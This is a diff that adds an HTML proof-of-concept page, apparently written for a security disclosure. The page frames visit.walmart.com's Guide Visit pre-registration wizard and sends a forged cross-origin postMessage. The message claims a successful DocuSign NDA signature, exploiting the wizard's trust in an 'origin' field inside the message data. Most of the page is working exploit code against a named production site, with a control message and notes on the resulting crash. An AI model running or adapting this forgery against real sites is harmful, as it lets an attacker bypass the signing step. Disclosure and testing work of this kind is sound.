@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Guide Visit NDA - postMessage origin demonstration</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font: 15px/1.5 system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 0; padding: 24px; max-width: 1100px; }
+  h1 { font-size: 20px; margin: 0 0 8px; }
+  p { margin: 8px 0; }
+  code { background: rgba(127,127,127,.15); padding: 1px 4px; border-radius: 4px; }
+  .row { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; margin: 12px 0; }
+  input[type=text] { width: 340px; padding: 6px 8px; font: inherit; }
+  button { padding: 7px 12px; font: inherit; cursor: pointer; }
+  #frame { width: 100%; height: 640px; border: 1px solid rgba(127,127,127,.45); margin-top: 12px; background: #fff; }
+  #log { background: rgba(127,127,127,.12); padding: 12px; min-height: 90px; white-space: pre-wrap; font: 12px/1.45 ui-monospace, SFMono-Regular, Menlo, monospace; border-radius: 6px; }
+  .muted { opacity: .75; font-size: 13px; }
+  .warn { border-left: 3px solid #c98a00; padding: 8px 12px; background: rgba(201,138,0,.10); margin: 14px 0; }
+</style>
+</head>
+<body>
+<h1>Guide Visit NDA - cross-origin postMessage demonstration</h1>
+<p class="muted">Target: <code>visit.walmart.com</code>. This page is a stand-in for any attacker-controlled origin. It frames the Guide Visit wizard and sends the same message the DocuSign return page sends. No files, cookies, or accounts are touched; the only action is a <code>postMessage</code> to the framed page.</p>
+<p>Parent page origin: <code id="origin"></code></p>
+
+<div class="row">
+  <label for="preregid">Pre-registration id</label>
+  <input type="text" id="preregid" value="poc-demo-0000" spellcheck="false" autocomplete="off">
+  <label><input type="checkbox" id="fullflow"> start at the invite entry route instead of the NDA route</label>
+</div>
+<div class="row">
+  <button id="load">Load wizard</button>
+  <button id="send">Send forged DOCUSIGN SUCCESS</button>
+  <button id="control">Send control (wrong origin value)</button>
+  <button id="clear">Clear log</button>
+  <label><input type="checkbox" id="auto"> auto-send forged message 8 s after load</label>
+</div>
+
+<div class="warn">
+  The wizard trusts the <code>origin</code> field inside the message data, not the sender's origin. The
+  forged message sets <code>ndaAgreementId</code> in the wizard's form state. On the production bundle
+  fetched on 2026-10-18 the status alert then throws a <code>jsxDEV</code> render error (a build defect,
+  present since the 2026-09-01 bundle) and the frame unmounts. The message is still consumed; the crash
+  itself is what shows the success branch was entered. The control button proves the reaction is
+  specific to the forged <code>origin</code> value.
+</div>
+
+<iframe id="frame" title="Guide Visit wizard" referrerpolicy="no-referrer"></iframe>
+<pre id="log"></pre>
+
+<script>
+(function () {
+  'use strict';
+  var TARGET_ORIGIN = 'https://visit.walmart.com';
+  var frame = document.getElementById('frame');
+  var logEl = document.getElementById('log');
+  var idEl = document.getElementById('preregid');
+  var fullEl = document.getElementById('fullflow');
+  var autoEl = document.getElementById('auto');
+  var autoTimer = null;
+
+  document.getElementById('origin').textContent = location.origin;
+
+  function log(line) {
+    var t = new Date().toISOString().replace('T', ' ').replace('Z', 'Z');
+    logEl.textContent += '[' + t + '] ' + line + '\n';
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function wizardUrl() {
+    var id = idEl.value.trim() || 'poc-demo-0000';
+    var base = TARGET_ORIGIN + '/pre-reg/' + encodeURIComponent(id);
+    return fullEl.checked ? base : base + '/NDA';
+  }
+
+  function loadWizard() {
+    if (autoTimer) { clearTimeout(autoTimer); autoTimer = null; }
+    var url = wizardUrl();
+    log('load ' + url);
+    log('note: the id is used only as the path segment; it is not sent in a Referer (referrerpolicy=no-referrer)');
+    // Force a fresh document: assigning the same src after a crash can reuse the dead frame.
+    frame.src = 'about:blank';
+    setTimeout(function () {
+      frame.src = url;
+      if (autoEl.checked) {
+        autoTimer = setTimeout(function () {
+          log('auto-send timer fired');
+          sendForged();
+        }, 8000);
+      }
+    }, 150);
+  }
+
+  function post(payload, label) {
+    var w = frame.contentWindow;
+    if (!w) { log(label + ': no frame window yet'); return; }
+    w.postMessage(payload, TARGET_ORIGIN);
+    log(label + ' -> ' + TARGET_ORIGIN + ' ' + JSON.stringify(payload));
+    log('reaction is visible in the frame and in the browser console (cross-origin page, so this parent cannot read the frame DOM)');
+  }
+
+  function sendForged() {
+    post({
+      origin: 'DOCUSIGN',
+      status: 'SUCCESS',
+      envelopeId: 'FORGED-NDA-001',
+      message: 'document Signed'
+    }, 'send forged');
+  }
+
+  function sendControl() {
+    post({
+      origin: 'NOT-DOCUSIGN',
+      status: 'SUCCESS',
+      envelopeId: 'CONTROL-000',
+      message: 'document Signed'
+    }, 'send control');
+  }
+
+  document.getElementById('load').addEventListener('click', loadWizard);
+  document.getElementById('send').addEventListener('click', sendForged);
+  document.getElementById('control').addEventListener('click', sendControl);
+  document.getElementById('clear').addEventListener('click', function () { logEl.textContent = ''; });
+
+  log('parent origin: ' + location.origin);
+  log('target origin: ' + TARGET_ORIGIN);
+  log('ready');
+})();
+</script>
+</body>
+</html>
